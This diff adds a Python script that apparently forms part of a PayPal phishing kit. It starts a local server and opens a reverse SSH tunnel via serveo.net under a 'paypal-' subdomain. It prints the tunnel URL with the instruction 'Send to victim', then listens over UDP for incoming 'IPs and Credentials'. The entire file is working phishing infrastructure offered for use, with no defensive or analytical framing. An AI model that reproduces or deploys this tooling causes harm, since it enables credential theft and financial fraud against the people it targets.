@@ -1,0 +1,53 @@
+import socketserver , os , threading , time , random
+port__1 = random.randint(1000,9999)
+with open('PORT','w') as wf:
+  wf.write(str(port__1))
+with open('PORT','r') as rf:
+  port = int(rf.read())
+HOST, PORT = "localhost", port
+class GET:
+    def __init__(self):
+        NumderHost = random.randint(10000,99999)
+        self.host = 'paypal-%s'%str(NumderHost)
+        self.Main()
+        threading.Thread(target=self.HostName).start()
+        self.LocalHost()
+
+    def LocalHost(self):
+        os.system('python3 app 2> /dev/null > data')
+
+    def HostName(self):
+        os.system('ssh -o ServerAliveInterval=60 -R {}:80:localhost:{} serveo.net 2> /dev/null > data'.format(self.host,port))
+
+    def Main(self):
+        print('\033[1;32m[\033[1;37m*\033[1;32m] Starting localhost server...')
+        time.sleep(1)
+        print('\033[1;32m[\033[1;37m*\033[1;32m] Starting ssh server...')
+        time.sleep(3)
+        print('[\033[1;37m*\033[1;32m] Starting server...')
+        time.sleep(2)
+
+        print('\n\033[1;33m[\033[1;37m*\033[1;33m] Send to victim: \033[1;36mhttps://'+self.host+'.serveo.net')
+        print('\n\n\033[1;32m[\033[1;37m*\033[1;32m] Waiting IPs and Credentials, \033[1;37mPress Ctrl + C to exit...')
+
+class MyUDPHandler(socketserver.BaseRequestHandler):
+    """
+    This class works similar to the TCP handler class, except that
+    self.request consists of a pair of data and client socket, and since
+    there is no connection the client address must be given explicitly
+    when sending data back via sendto().
+    """
+
+    def handle(self):
+        data = self.request[0].strip()
+        socket = self.request[1]
+        print(data.decode('utf-8'))
+
+if __name__ == "__main__":
+    try:
+        Get = threading.Thread(target=GET)
+        Get.start()
+        with socketserver.UDPServer((HOST, PORT), MyUDPHandler) as server:
+            server.serve_forever()
+    except KeyboardInterrupt:
+        exit()
